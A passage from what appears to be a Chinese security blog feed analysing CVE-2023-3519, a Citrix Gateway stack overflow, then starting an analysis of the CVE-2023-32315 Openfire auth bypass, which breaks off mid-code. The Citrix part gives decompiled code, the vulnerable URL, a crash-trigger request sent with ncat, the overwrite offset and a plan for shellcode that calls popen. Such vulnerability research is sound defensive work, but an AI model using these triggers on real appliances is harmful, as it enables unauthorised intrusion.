&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_41;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">int&lt;/span>)a3 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>nahb&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)a3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>lmas&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;SP?&amp;#34;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> (aSamlsp_0[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> a4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v13 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v13;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_39;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_WORD &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;IdP?&amp;#34;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> (aSamlidp_1[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> a4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_is_valid_auth_action&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v15 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> v15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_39;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (_DWORD)a3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>mrof&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>v8 &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x2020202020202020LL&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>osssmrof&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v7 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> v9;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v22 &lt;span style="color:#f92672">=&lt;/span> a4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> valid_fsso_server &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_get_valid_fsso_server&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ns_aaa_gwtest_handler&lt;/code>由&lt;code>ns_vpn_process_unauthenticated_request&lt;/code>函数调用，在&lt;code>ns_vpn_process_unauthenticated_request&lt;/code>函数中有如下逻辑，当请求路径为&lt;code>/gwtest/&lt;/code>时进入调用到目标函数的逻辑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v51 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1702131559&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#f92672">*&lt;/span>(_QWORD &lt;span style="color:#f92672">*&lt;/span>)v26 &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">/&lt;/span>tsetwg&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_2888;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_437:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( ns_async_ctx &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">108&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">652&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">panic_0&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)ns_async_callers_context_size,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)(ns_async_callers_context_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">192&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ns_async_callers_context_size &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">192&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v30 &lt;span style="color:#f92672">=&lt;/span> v1891;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( ns_async_ctx )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">87101427&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_4683;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v25 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">104&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a2 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v25;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(ns_async_ctx &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v25 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">108&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">172&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v25 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x611&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_759;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v164 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ns_aaa_gwtest_handler&lt;/span>((&lt;span style="color:#66d9ef">__int64&lt;/span>)v1896, v1897, &lt;span style="color:#ae81ff">0LL&lt;/span>, v1891);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>综上可以总结到调用到漏洞函数&lt;code>ns_aaa_saml_url_decode_inner&lt;/code>所需要的url为：&lt;/p>
&lt;pre tabindex="0">&lt;code>http://target/gwtest/formssso?event=start&amp;amp;target=[overflow char]
&lt;/code>&lt;/pre>&lt;p>只需要让&lt;code>[overflow char]&lt;/code>过长即可溢出在&lt;code>ns_aaa_gwtest_get_valid_fsso_server&lt;/code>函数内的char数组，造成溢出。查看nsppe防护，可以发现PIE,CANARY都没开，只需要利用栈溢出写入shellcode然后&lt;code>jmp esp&lt;/code>即可执行shellcode。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># checksec --file=nsppe_unpatched&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH &lt;span style="color:#ae81ff">68527&lt;/span> Symbols No &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> nsppe_unpatched
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>动态调试&lt;/strong>&lt;/p>
&lt;p>找到nsppe进程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>root@citrix3# ps aux | grep nsppe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root &lt;span style="color:#ae81ff">457&lt;/span> 100.0 43.2 &lt;span style="color:#ae81ff">693320&lt;/span> &lt;span style="color:#ae81ff">693560&lt;/span> - Rs 19:10 223:34.32 nsppe &lt;span style="color:#f92672">(&lt;/span>NSPPE-00&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>禁用看门狗，使用命令禁止发送该信号&lt;/p>
&lt;pre tabindex="0">&lt;code>root@citrix3# nspf help
Usage: &amp;#39;/netscaler/nspf ((&amp;lt;process_name&amp;gt; | &amp;lt;pid&amp;gt;) &amp;lt;action&amp;gt; | query)&amp;#39;
where &amp;lt;process_name&amp;gt; is one of:
NSPPE-00 aslearn awsconfig bgpd de
imi isisd metricscollectomonuploadd nsaaad
nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd
nscopo nsfsyncd nsgslbautosyncnslcd nslped
nsm nsnetsvc nsrised nstraceaggregatnsumond
ospf6d ospfd ptpd ripd ripngd
snmpd syshealthd
root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0
nspf NSPPE-00 pbmonitor 0
Removing pitboss monitor on process NSPPE-00 pid 37387
&lt;/code>&lt;/pre>&lt;p>使用Citrix ADC自带的gdb附加调试nsppe&lt;/p>
&lt;pre tabindex="0">&lt;code>gdb /netscaler/nsppe 461
&lt;/code>&lt;/pre>&lt;p>使用pattern_creat.rb创建字符串&lt;/p>
&lt;pre tabindex="0">&lt;code>┌──(root㉿kali)-[~]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
&lt;/code>&lt;/pre>&lt;p>发送payload，触发漏洞，此时rsp为6641376641366641，对应offset为168，也就是168开始覆盖rsp
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/5.png" />&lt;/p>
&lt;p>发送payload，触发漏洞，此时rip指向0xcc指令地址，gdb断下&lt;/p>
&lt;pre tabindex="0">&lt;code>echo -ne &amp;#39;GET /gwtest/formssso?event=start&amp;amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x8c\x6d\x00\x00\x00\x00\x00\xcc HTTP/1.1\r\nHost: 192.168.52.108\r\n\r\n&amp;#39; | ncat --ssl 192.168.52.108 443
&lt;/code>&lt;/pre>&lt;p>在gdb中可以看到缓冲区位于rbp-0xa0处。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/4.png" />&lt;/p>
&lt;p>通过谷歌，知道在Citrix ADC中，nsppe是网络子系统，一当nsppe进程down了，会造成系统无法处理网络请求，最直观的表现就是当ssh连接目标系统并使用gdb调试nsppe进程的时候，ssh会卡死，而后退出，因为服务器的网络子系统处于调试状态，没办法处理网络请求。&lt;/p>
&lt;p>所以在整个利用过程中，为了保证能够获取到shell/保活系统，要保证nsppe进程不会挂掉。通过shellcode调用popen函数然后执行系统命令，并返回到上层调用栈（保证请求正常返回）。&lt;/p>
&lt;p>之后就是常规则shellcode编写了，直接使用二进制文件内硬编码的popen函数地址即可。需要注意的就是nsppe内实现的url解码逻辑有点不太一样， 具体参考参考链接，这里就不详细展开了。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>整个漏洞产生和利用原理简单直接，因为nsppe没有开启任何溢出防护措施，直接使用jmp esp即可，让我想起了这个经典表情包
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-3519-Cirtix-Gateway-RCE.zh-cn.assets/6.png" />
不知道是不是因为这个引擎起源比较久的原因，nsppe没有去除调试符号，对于理解原理和调试exp都有非常大的帮助。&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://mybrokencomputer.net/t/citrix-adc-netscaler-developer-license/42" target="_blank">申请开发人员许可&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/" target="_blank">https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-07-27T10:48:40+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-32315 Openfire 身份认证绕过漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</link><pubDate>Tue, 20 Jun 2023 17:42:33 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Openfire中存在目录遍历漏洞，通过使用UTF-16编码的&lt;code>../&lt;/code>，可以绕过身份验证，访问一些敏感接口，通过这些接口可以新建管理员，上传插件，进一步造成代码执行&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>3.10.0 &amp;lt;= Openfire &amp;lt; 4.6.8
4.7.0 &amp;lt;= Openfire &amp;lt; 4.7.5&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>直接下载对应的exe安装即可&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>在Openfire中，&lt;code>/setup/setup-*&lt;/code>开头的url由AuthCheckFilter处理，并且访问该url无需经过身份验证（白名单），这个Filter定义在&lt;code>xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java&lt;/code>中。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#f92672">&amp;lt;filter-name&amp;gt;&lt;/span>AuthCheck&lt;span style="color:#f92672">&amp;lt;/filter-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#f92672">&amp;lt;filter-class&amp;gt;&lt;/span>org.jivesoftware.admin.AuthCheckFilter&lt;span style="color:#f92672">&amp;lt;/filter-class&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#f92672">&amp;lt;init-param&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#f92672">&amp;lt;param-name&amp;gt;&lt;/span>excludes&lt;span style="color:#f92672">&amp;lt;/param-name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#f92672">&amp;lt;param-value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#f92672">&amp;lt;/param-value&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#f92672">&amp;lt;/init-param&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#f92672">&amp;lt;/filter&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java&lt;/code>中通过以下代码判断是否存在目录穿越&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">testURLPassesExclude&lt;/span>(String url, String exclude) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e">// If the exclude rule includes a &amp;#34;?&amp;#34; character, the url must exactly match the exclude rule.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e">// If the exclude rule does not contain the &amp;#34;?&amp;#34; character, we chop off everything starting at the first &amp;#34;?&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e">// in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a &amp;#34;*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e">// character then the URL is allowed if it exactly matches everything before the * and there are no &amp;#34;..&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e">// characters after the &amp;#34;*&amp;#34;. All data in the URL before&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">if&lt;/span> (exclude.&lt;span style="color:#a6e22e">endsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;*&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">if&lt;/span> (url.&lt;span style="color:#a6e22e">startsWith&lt;/span>(exclude.&lt;span style="color:#a6e22e">substring&lt;/span>(0, exclude.&lt;span style="color:#a6e22e">length&lt;/span>()&lt;span style="color:#f92672">-&lt;/span>1))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                &lt;span style="color:#75715e">// Now make sure that there are no &amp;#34;..&amp;#34; characters in the rest of the URL.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>url.&lt;span style="color:#a6e22e">contains&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;..&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>url.&lt;span style="color:#a6e22e">toLowerCase&lt;/span>().&lt;span style="color:#a6e22e">contains&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;%2e&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                    &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>                }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (exclude.&lt;span style="color:#a6e22e">contains&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>)) {
